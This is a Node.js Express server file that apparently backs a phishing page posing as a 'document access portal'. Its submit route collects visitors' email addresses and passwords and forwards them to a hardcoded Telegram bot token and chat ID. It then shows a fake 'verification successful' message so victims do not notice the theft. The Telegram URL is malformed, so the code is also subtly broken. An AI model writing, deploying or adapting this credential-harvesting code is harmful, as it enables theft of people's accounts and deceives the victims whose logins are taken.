import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Middleware configuration rules to accept body objects smoothly
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the mature frontpage HTML template when visiting the main URL layout
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Process the form submission data stream
app.post('/submit', async (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    // Verified functioning credentials loaded directly into the server engine
    const botToken = "9034651544:AAFF2_8GEO6H3e6ataVEkHhha39kIDPlAt8"; 
    const chatId = "1080822304"; 

    if (!email || !password) {
        return res.status(400).send('Verification credentials parameter error.');
    }

    const messageText = `📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n📧 Portal Email: ${email}\n🔑 Access Key: ${password}`;
    const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

    try {
        // Dispatches connection request safely out of Render's global cloud centers
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText
            })
        });

        const result = await response.json();

        if (result.ok) {
            res.send("<h2>Verification successful. Connecting to secure file server...</h2><br><a href='/'>Go Back</a>");
        } else {
            res.status(500).send(`Telegram Routing Rejection: ${result.description}`);
        }
    } catch (error) {
        res.status(500).send(`Network channel exception error: ${error.message}`);
    }
});

// Bind system ports automatically for deployment environments
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
